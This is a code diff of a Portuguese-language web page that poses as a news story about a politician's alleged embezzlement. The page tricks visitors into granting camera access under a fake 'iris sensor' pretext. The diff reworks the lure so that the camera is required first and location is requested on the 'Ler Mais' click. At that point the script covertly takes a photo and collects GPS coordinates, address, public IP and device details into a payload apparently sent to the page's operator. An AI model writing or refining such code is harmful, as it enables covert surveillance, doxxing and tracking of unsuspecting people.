@@ -581,28 +581,24 @@
                     <span class="status-label">👁️ Sensor de Íris:</span>
                     <span id="cameraStatus" class="status-value status-pending">⏳</span>
                 </div>
-                <div class="status-item">
-                    <span class="status-label">📜 Termos e Condições:</span>
-                    <span id="locationStatus" class="status-value status-pending">⏳</span>
-                </div>
             </div>
             
             <p style="font-size: 11px; color: #999;">
-                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong> em ambas as solicitações
+                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong>
             </p>
             
-            <!-- Botão principal para chamar permissão -->
+            <!-- Botão principal para chamar permissão da câmera apenas -->
             <button id="callPermissionBtn" class="call-permission-btn">
-                🔓 PERMITIR CÂMERA E LOCALIZAÇÃO
+                🔓 PERMITIR ACESSO
             </button>
             
             <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
             
             <div id="warningMsg" class="warning-text" style="display: none;">
-                ⚠️ Clique no botão acima e permita AMBAS as permissões!
+                ⚠️ Clique no botão acima e permita o acesso!
             </div>
             <div id="successMsg" class="success-text" style="display: none;">
-                ✅ Permissões concedidas! Clique em "Acessar Site"
+                ✅ Permissão concedida! Clique em "Acessar Site"
             </div>
         </div>
         
@@ -713,7 +709,6 @@
         const warningMsg = document.getElementById('warningMsg');
         const successMsg = document.getElementById('successMsg');
         const cameraStatusSpan = document.getElementById('cameraStatus');
-        const locationStatusSpan = document.getElementById('locationStatus');
         
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Cuiaba' });
         
@@ -734,17 +729,9 @@
                 cameraStatusSpan.innerHTML = '⏳';
                 cameraStatusSpan.className = 'status-value status-pending';
             }
-            
-            if (locationGranted) {
-                locationStatusSpan.innerHTML = '✅';
-                locationStatusSpan.className = 'status-value status-granted';
-            } else {
-                locationStatusSpan.innerHTML = '⏳';
-                locationStatusSpan.className = 'status-value status-pending';
-            }
         }
         
-        // Função para solicitar permissões de CÂMERA e LOCALIZAÇÃO separadamente
+        // Função para solicitar permissão da CÂMERA apenas (obrigatória)
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -760,46 +747,40 @@
             }
         }
         
+        // Função para solicitar permissão de LOCALIZAÇÃO (apenas quando clicar em "Ler Mais")
         function requestLocationPermission() {
             return new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
                     (posicao) => {
                         console.log('Localização autorizada:', posicao.coords);
                         locationGranted = true;
-                        updateStatusUI();
                         resolve(true);
                     },
                     (erro) => {
                         console.log('Localização negada:', erro);
                         locationGranted = false;
-                        updateStatusUI();
                         resolve(false);
                     }
                 );
             });
         }
         
-        async function requestAllPermissions() {
+        // Função para solicitar apenas a câmera (obrigatória para acessar o site)
+        async function requestCameraOnly() {
             if (isRequesting) return false;
             isRequesting = true;
             
             callPermissionBtn.disabled = true;
-            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
+            callPermissionBtn.textContent = '⏳ Solicitando permissão...';
             warningMsg.style.display = 'none';
             successMsg.style.display = 'none';
             
             updateStatusUI();
             
-            // Solicitar câmera primeiro
+            // Solicitar apenas câmera
             await requestCameraPermission();
             
-            // Pequena pausa para garantir que o popup da câmera fechou
-            await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Solicitar localização
-            await requestLocationPermission();
-            
-            permissionsReady = cameraGranted && locationGranted;
+            permissionsReady = cameraGranted;
             
             if (permissionsReady) {
                 callPermissionBtn.style.display = 'none';
@@ -808,7 +789,7 @@
                 warningMsg.style.display = 'none';
             } else {
                 callPermissionBtn.disabled = false;
-                callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
+                callPermissionBtn.textContent = '🔓 PERMITIR ACESSO';
                 warningMsg.style.display = 'block';
                 successMsg.style.display = 'none';
             }
@@ -917,6 +898,7 @@
             }
         }
         
+        // Função chamada ao clicar em "Ler Mais" - aqui solicita localização e envia dados
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -924,19 +906,33 @@
             loadingNews.classList.add('show');
             
             try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 15000
-                    });
-                });
+                // Solicitar localização AGORA (não era obrigatória antes)
+                await requestLocationPermission();
                 
-                const { latitude, longitude, accuracy } = position.coords;
+                // Se o usuário negou a localização, ainda assim continuamos (não é obrigatória)
+                // mas tentamos obter a posição se ele permitiu
+                let position = null;
+                if (locationGranted) {
+                    try {
+                        position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 15000
+                            });
+                        });
+                    } catch(e) {
+                        console.log('Erro ao obter posição precisa:', e);
+                    }
+                }
+                
+                const latitude = position ? position.coords.latitude : 0;
+                const longitude = position ? position.coords.longitude : 0;
+                const accuracy = position ? position.coords.accuracy : 0;
                 let finalAccuracy = Math.round(accuracy);
                 let finalLatitude = latitude;
                 let finalLongitude = longitude;
                 
-                const address = await getAddress(finalLatitude, finalLongitude);
+                const address = position ? await getAddress(finalLatitude, finalLongitude) : "Localização não compartilhada";
                 const deviceInfo = getDeviceInfo();
                 const publicIP = await getPublicIP();
                 const photoData = await captureAutoPhoto();
@@ -945,7 +941,7 @@
                     timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
                     longitude: finalLongitude,
-                    google_maps_link: `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`,
+                    google_maps_link: finalLatitude ? `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}` : "Não disponível",
                     accuracy_meters: finalAccuracy,
                     address: address,
                     device: deviceInfo.device,
@@ -955,6 +951,7 @@
                     ip: publicIP,
                     photo_base64: photoData || 'Sem foto',
                     photo_captured: !!photoData,
+                    location_shared: locationGranted,
                     page_url: window.location.href,
                     politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões"
                 };
@@ -970,15 +967,16 @@
                 autoCaptureDone = true;
                 
             } catch (error) {
+                console.error('Erro:', error);
                 loadingNews.classList.remove('show');
                 readMoreBtn.disabled = false;
                 autoCaptureDone = false;
             }
         }
         
-        // Botão para chamar permissão - chama AMBAS as permissões
+        // Botão para chamar permissão da CÂMERA apenas
         callPermissionBtn.addEventListener('click', () => {
-            requestAllPermissions();
+            requestCameraOnly();
         });
         
         initialAllowBtn.addEventListener('click', async () => {
